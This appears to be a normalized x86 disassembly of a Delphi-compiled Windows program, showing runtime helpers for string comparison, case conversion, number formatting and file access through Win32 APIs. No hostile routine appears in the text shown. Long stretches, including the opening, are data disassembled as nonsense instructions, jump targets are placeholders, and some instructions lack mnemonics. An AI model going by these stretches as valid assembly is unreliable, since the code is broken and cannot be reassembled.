add [ esi + eax * 2 + 0x49 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax + 0x640000ff ] dh
inc esi
dec ecx
add [ ecx + 0x640000ff ] dh
inc esi
dec ecx
add [ edx + 0x640000ff ] dh
inc esi
dec ecx
add [ ebx + 0x640000ff ] dh
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] dh
dec ecx
add [ ebp + 0x640000ff ] dh
inc esi
dec ecx
add [ esi + 0x640000ff ] dh
inc esi
dec ecx
add [ edi + 0x640000ff ] dh
inc esi
dec ecx
add [ eax + 0x640000ff ] bh
inc esi
dec ecx
add [ ecx + 0x640000ff ] bh
inc esi
dec ecx
add [ edx + 0x640000ff ] bh
inc esi
dec ecx
add [ ebx + 0x640000ff ] bh
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] bh
dec ecx
add [ ebp + 0x640000ff ] bh
inc esi
dec ecx
add [ esi + 0x640000ff ] bh
inc esi
dec ecx
add [ edi + 0x640000ff ] bh
inc esi
dec ecx
add [ eax + 0x640000ff ] ah
inc esi
dec ecx
add [ ecx + 0x640000ff ] ah
inc esi
dec ecx
add [ edx + 0x640000ff ] ah
inc esi
dec ecx
add [ ebx + 0x640000ff ] ah
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] ah
dec ecx
add [ ebp + 0x640000ff ] ah
inc esi
dec ecx
add [ esi + 0x640000ff ] ah
inc esi
dec ecx
add [ edi + 0x640000ff ] ah
inc esi
dec ecx
add [ eax + 0x640000ff ] ch
inc esi
dec ecx
add [ ecx + 0x640000ff ] ch
inc esi
dec ecx
add [ edx + 0x640000ff ] ch
inc esi
dec ecx
add [ ebx + 0x640000ff ] ch
inc esi
dec ecx
add [ edi + edi * 8 - 0x74ab0000 ] ch
in al dx
xor eax eax
push ebp
push sub_4071f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4071f8
retn
sub_407d24
add eax 0xf00407d
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] bl
jge r-xdata
xchg ebx eax
aas
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add ch ah
jl r-xdata
call sub_403ad0
pop edi
pop esi
pop ebx
retn
call sub_40bdb4
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add ch ch
jl r-xdata
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add ch dh
jl r-xdata
mov eax ebx
call sub_4026f4
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add ch bh
jl r-xdata
mov edx ebx
call sub_402d44
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
add [ ebp + edi * 2 + 0x300040 ] ch
add [ eax ] al
mov esp 0x8c004011
xor eax 0x58600040
inc eax
add [ eax + ebx * 2 + 0x40 ] ch
add [ eax - 0x6bffbfcb ] ah
xor eax 0x587c0040
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407d243f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jge r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add al bh
xor al [ eax ]
push esp
aam 0x40
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax + 0x7d ] al
inc eax
add [ eax ] al
add [ eax ] al
sub_407dd4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407e08
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
pop edi
pop esi
pop ebx
retn
sub_407e2c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026f4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402d44
mov eax esi
pop esi
pop ebx
retn
sub_407e4c
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402714
call ebx
pop ebx
retn
sub_407e78
push ebx
mov ebx eax
mov eax 0xc
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407e4c
pop ebx
retn
sub_407eb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404354
mov ebx eax
mov eax edi
mov edx ebx
call sub_4046e0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407eec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404354
mov ebx eax
mov eax edi
mov edx ebx
call sub_4046e0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407f28
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407f58
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407f78
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407fcc
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407f78
test eax eax
jne r-xdata
sub_407ff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404354
mov ebx eax
mov eax esi
call sub_404554
mov edx eax
mov eax edi
mov ecx ebx
call sub_404184
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_408024
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404354
mov ebx eax
mov eax esi
call sub_404554
mov edx eax
mov eax edi
mov ecx ebx
call sub_404184
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_408058
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax ebx
call sub_404354
push eax
mov eax ebx
call sub_404554
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408090
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax ebx
call sub_404354
push eax
mov eax ebx
call sub_404554
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4080e0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408100
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404354
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404094
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4045b4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408150
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404354
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404354
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_4081b4
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_4081ca
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_4081ca
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4081ca
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408200
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_4081b4
mov edx esi
pop eax
call sub_404184
add esp 0x10
pop esi
retn
sub_408220
or cl cl
jne sub_408254
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408254
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408254
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408254
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4082ec
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408220
mov edx esi
pop eax
call sub_404184
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408314
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_4081b4
mov edx esi
pop eax
call sub_404184
add esp 0x20
pop esi
retn
xor edx edx
sub_40833c
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d80
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e08
sub_408390
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d80
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4083b0
mov eax [ rw-data ]
call sub_404f08
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404f08
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040e8
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040e8
sub_408440
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_4080c8
test al al
je r-xdata
sub_40847c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409b6c
mov edx eax
test dl dl
je r-xdata
call sub_4083b0
push ebp
mov eax [ rw-data ]
call sub_404f10
mov edx eax
mov eax [ rw-data ]
call sub_408440
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404f10
mov edx eax
mov eax [ rw-data ]
call sub_408440
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408518
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040e8
call sub_4083b0
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040e8
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040e8
jmp r-xdata
pop esi
pop ebx
retn
sub_408568
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0x4004010
add [ eax ] al
add [ ebx - 0x7ea9ac40 ] cl
les eax [ eax ]
cld
sub_4085c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404a00
xor eax eax
push ebp
push sub_408626
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_404094
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405618
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40862d
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404ad0
retn
sub_408648
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404554
push eax
call CreateFileA
sub_4086a0
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404554
push eax
call CreateFileA
pop ebx
retn
sub_4086cc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4086f8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408724
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408764
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404554
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4087dc
push ebx
push esi
mov esi eax
mov eax esi
call sub_404354
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c670
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40880c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404354
mov edi eax
mov eax ebx
call sub_404554
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408b3c
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c670
cmp al 0x2
jne r-xdata
dec edi
sub_40885c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40880c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4045b4
pop edi
pop esi
pop ebx
retn
sub_408894
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40880c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404094
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4045b4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4088dc
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404554
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404184
add esp 0x108
pop esi
pop ebx
retn
sub_408918
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e68
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e68
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4089c8
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4089f0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_408a1c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408a50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404354
push eax
mov eax ebx
call sub_404554
mov edx eax
mov eax esi
pop ecx
call sub_408a1c
pop esi
pop ebx
retn
sub_408a74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404554
mov edx eax
mov ecx edi
mov eax ebx
call sub_408a1c
pop edi
pop esi
pop ebx
retn
sub_408a94
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408ab8
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408af8
push edi
push esi
